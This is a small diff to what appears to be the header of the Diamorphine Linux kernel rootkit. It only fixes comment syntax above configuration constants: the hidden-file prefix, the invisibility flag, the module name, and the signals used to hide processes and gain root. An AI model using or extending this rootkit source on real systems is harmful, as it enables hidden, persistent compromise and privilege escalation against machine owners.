@@ -4,13 +4,13 @@ struct linux_dirent {
         unsigned short  d_reclen;
         char            d_name[1];
 };
-\\ To change
+// To change
 #define MAGIC_PREFIX "diamorphine_secret" 
 
 #define PF_INVISIBLE 0x10000000
-\\ To change
+// To change
 #define MODULE_NAME "diamorphine"
-\\ To change
+// To change
 enum {
 	SIGINVIS = 31,
 	SIGSUPER = 64,
